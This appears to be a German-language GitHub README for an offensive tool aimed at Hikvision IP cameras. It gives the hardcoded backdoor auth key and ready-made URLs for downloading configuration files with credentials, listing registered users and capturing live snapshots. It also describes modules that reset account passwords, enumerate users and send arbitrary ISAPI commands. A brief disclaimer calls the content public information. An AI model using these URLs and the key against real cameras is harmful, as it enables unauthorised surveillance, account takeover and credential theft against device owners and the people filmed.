# hikvision-sdk-cam

English version can be found [here](https://github.com/MatrixEditor/hikvision-sdk-cam/blob/main/eng.md).

<b>
DISCLAIMER: Alle informationen, die hier gepostet werden/ wurden, sind öffentlich auf anderen Seiten zugänglich. Dieses Repository bietet nur einen generellen Überblick über die Möglichkeitenvon Übergriffen, die durch die gebotenen Schwachstellen entstanden sind.
</b>

## Backdoor

Es ist schon seit ein paar Jahren bekannt, dass es eine Backdoor in den Hikvision-Kameras gibt. Diese hätte geheim gehalten werden können, hätte man den Authentifizierungsschlüssel nicht in ein open-source Passwort-Reset-Tool geschrieben (Stichwort: HikPassword-Helper). Der Schlüssel lautet:

    AUTH_KEY = 'YWRtaW46MTEK'

Mithilfe dieses Schlüssels ist der Zugriff auf die interne Web-API der Kamera grundsätzlich möglich. Die Befehle dieser API sind in der Datei 'websdk.js' zu finden (einfach über einen beliebigen Browser die login-Seite überprüfen). Ein paar stehen mit Erklärung dazu in der Datei [commands.py](https://github.com/MatrixEditor/hikvision-sdk-cam/blob/main/src/base/commands.py).

## Zugriff erhalten

Um nun Zugriff auf das Gerät zu bekommen, gibt es verschiedene Wege, die recht einfach umzusetzen sind:

1. Die 'configData'-Datei herunterladen, entschlüsseln und nach den Credentials für registrierten Accounts suchen (Stichwort: hikvision-decryptor github)

    LINK: http:// [IP-ADDR] /System/configurationFile?auth=YWRtaW46MTEK

2. Die registrierten Nutzer/Accounts über einen Link laden und für einen das Passwort ändern (Anleitung dazu weiter unten)

### Links ohne Authentifizierung

Dieser Link zeigt Informationen zu allen registrierten Nutzern an:

    * http://<IP-ADDRESS>/Security/users?auth=YWRtaW46MTEK oder http://<IP-ADDRESS>/ISAPI/Security/users?auth=YWRtaW46MTEK

Hiermit kann ein (live)-Standbild der Kamera übertragen werden:

    *http://<IP-ADDRESS>/onvif-http/snapshot?auth=YWRtaW46MTEK

By the way: Die meisten API-Abfragen, siehe [commands.py](https://github.com/MatrixEditor/hikvision-sdk-cam/blob/main/src/base/commands.py) können auch mit diesem AUTH_KEY getätigt werden.

URL für einen Livestream (mit VLC-Player oder QuickTime-Player wiedergeben; der AUTH_KEY funktionier hierbei nicht):

    rtsp://<UNAME>:<PWD>@192.168.189.5:554/Streaming/channels/1/

## Main.py

Der Aufbau dieses Programms ist gleich dem in dem Repository 'Frontier-Silicon-Radio'. Nach dem Start können nur noch die Befehle 'use', 'quit' und 'modules' benutzt werden:

* use [module-name] : nutzt das angegebene modul (die Namen der Module können mit 'modules' ausgegeben werden)
* modules : gibt die Namen aller geladenen Module aus
* quit : beendet das Programm

Wählt man nun ein Modul aus, wird dies im Konsolen-Prompt mit angegeben. Jetzt können nur noch die Befehle 'set', 'run', 'show_options' und 'back' benutzt werden:

* set [option] [value] : Setzt die gewählte Option auf den gegebenen Wert
* show options : gibt eine Liste mit allen nötigen Parametern aus
* run : startet das modul
* back : geht in das Startmenü zurück.

## Module

### /injection/password_changer

Mit diesem kleinen Script kann das Passwort eines bestimmten Nutzers/Accounts geändert werden (hierzu benötigt man lediglich den AUTH_KEY). Um dies zu tun benötigt das Programm folgende eingaben:

    * IP-Addresse der Kamera,
    * den Usernamen der Accounts,
    * das neue Passwort,
    * und die User-ID des Accounts.

### /injection/user_encounter

Hiermit können alle registrierten Nutzer mit ihrer ID, dem Usernamen und ihrem Rang ausgelesen werden. Um dies zu tun benötigt das Programm folgende eingaben:

    * IP-Adresse der Kamera

### /isapi/command_executor

Wie der Name dieses Moduls schon verrät, versucht hier das Programm eine HTTP-GET Anfrage zu machen um eine API-Abfrage zu tätigen. Dazu benötigt das Programm folgende eingaben:

    * IP-Addresse der Kamera,
    * den Befehl, angefangen mit einem  '/'

Falls hierbei keine Rückmeldung erscheint, einfach den Link im Browser eingeben und schauen, ob der Link doch funktioniert. Aus irgendwelchen Gründen schafft es die 'requests'-API nicht, die Authentifizierung der Seiten mit dem AUTH_KEY nicht, der Browser (getestet mit Chrome und Firefox) schon.

 
